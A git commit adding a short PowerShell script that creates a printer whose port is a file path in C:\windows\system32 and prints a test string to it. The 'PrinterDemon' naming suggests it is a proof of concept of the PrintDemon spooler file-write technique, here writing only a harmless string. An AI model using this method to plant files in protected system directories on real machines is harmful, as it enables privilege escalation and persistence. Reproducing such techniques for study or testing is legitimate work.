c0c31d8dfe77dbb29dd5235cc9031f00f718f6d8
francevarotz98 <fravar98@gmail.com>
2022-06-05 00:34:56 +0200

    script which add printer+port+driver and print to that printer

---
+++ addPrinter.ps1
@@ -0,0 +1,35 @@
+$printerName = "PrinterDemon5"
+$driverName = "Generic / Text Only"
+$portName = "c:\windows\system32\portDemon5.txt"
+
+$stringTest = "Th1s is 4 fr34k!ng t3st"
+
+# add printer driver, which supports all ASCII characters and most
+# characters of other character sets
+echo "[] Adding printer driver -> $driverName <-"
+Add-PrinterDriver -Name $driverName
+echo "[+] Done"
+
+# display printer drivers installed
+#Get-PrinterDriver
+
+# add printer port (to associate then to our printer)
+echo "[] Adding printer port -> $portName <-"
+Add-PrinterPort -Name $portName
+echo "[+] Done"
+
+# list printer ports installed in the machine
+echo "[] Listing printer ports ..."
+Get-PrinterPort
+
+# create printer + bind it to driver and port just created
+echo "[] Adding printer $printername and binding to previously created port+driver"
+Add-Printer -name $printerName -DriverName $driverName -PortName $portName
+echo "[+] Done"
+
+# list printers installed in machine
+#Get-Printer
+
+echo "[] Writing to printer $printerName ..."
+$stringTest | Out-Printer -name $printerName
+echo "[+] DONE"
